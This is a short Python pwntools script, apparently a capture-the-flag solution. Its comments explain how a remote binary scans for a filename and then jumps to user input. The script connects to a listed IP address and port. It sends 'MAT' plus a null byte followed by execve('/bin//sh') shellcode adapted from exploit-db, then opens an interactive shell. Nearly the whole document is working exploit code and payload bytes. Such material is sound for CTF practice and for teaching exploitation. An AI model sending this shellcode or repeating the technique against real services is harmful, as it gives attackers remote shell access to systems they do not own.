# There is a shellcode at the program start which calls “access” syscall, which check if process has access to file. Pointer to filename in ebx. ebx increments by 0x1000 each iteration and it will raise to address of our input soon, so we need to write filename:
# As we can see our input soon compares with MAT, so this is the file that exists:
# Next this instruction compares our input with “MAT\x00”, so we need to pass zero byte at the end of input
# Next we will be sent to jmp edi instruction, which will jump on our input+4, so we need to make a shellcode:
# p.sendline(b'MAT\x00SHELLCODE')
# SHELLCODE: https://www.exploit-db.com/exploits/41757
# FIX Shellcode with \x00 byte -> push 0x0; pop eax

from pwn import *

p = remote('46.246.39.89', 31332)
print(p.recv())

payload = b'MAT\x00\x6a\x0bj\x00X\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
print('PAYLOAD:')
print(hexdump(payload))
p.sendline(payload)
p.interactive()
